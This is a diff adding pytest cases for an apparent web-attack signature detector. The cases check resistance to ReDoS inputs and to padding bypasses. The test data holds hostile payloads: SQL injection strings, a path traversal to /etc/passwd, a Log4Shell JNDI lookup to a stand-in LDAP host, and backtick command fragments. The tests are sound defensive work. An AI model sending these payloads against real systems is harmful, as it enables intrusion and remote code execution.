@@ -274,3 +274,45 @@ def test_phase2_detections(t, rule):
 def test_normalize_triple_and_cap():
     assert normalize("%25252e") == "."
     assert normalize("%2525252525252e") != "."  # capped at 4 passes
+
+
+# ---- phase 3: ReDoS and padding ---------------------------------------------
+
+import time
+
+PATHOLOGICAL = {
+    "union-comments": "/i?id=1+union" + "/**/" * 2000,
+    "newlines": "/p?h=a;" + "%0a" * 8000,
+    "svg-open": "/s?q=" + "<svg" * 4000,
+    "lookup-default": "/?x=${" + ":-" * 4000,
+    "a-padding": "/?q=" + "a" * 16384,
+    "comment-open": "/?q=" + "/*" * 8192,
+    "backticks": "/?q=" + "`cat" * 4000,
+    "quotes-dashes": "/?q=" + "'--" * 5000,
+}
+
+
+@pytest.mark.parametrize("name", sorted(PATHOLOGICAL))
+def test_redos_regression(name):
+    e = ev(PATHOLOGICAL[name], ua=PATHOLOGICAL[name], ref=PATHOLOGICAL[name], status=200)
+    det = SignatureDetector()
+    t = time.perf_counter()
+    det.feed(e)
+    det.flush()
+    assert time.perf_counter() - t < 0.5
+
+
+def test_union_with_c_comments_still_detected():
+    assert "SIG-SQLI" in ids(run(ev("/i?id=1+union/**/select/*x*/1,2")))
+
+
+@pytest.mark.parametrize("payload,ua,rule", [
+    ("id=1+union+select+1,2", "", "SIG-SQLI"),
+    ("f=../../../../etc/passwd", "", "SIG-TRAVERSAL"),
+    ("x=1", "${jndi:ldap://x.test/a}", "SIG-LOG4SHELL"),
+])
+def test_padding_bypass(payload, ua, rule):
+    pad = "a" * 40000
+    # payload at the end of a padded field, and at the start
+    assert rule in ids(run(ev("/i?pad=" + pad + "&" + payload, ua=(pad + ua) or BROWSER)))
+    assert rule in ids(run(ev("/i?" + payload + "&pad=" + pad, ua=(ua + pad) or BROWSER)))
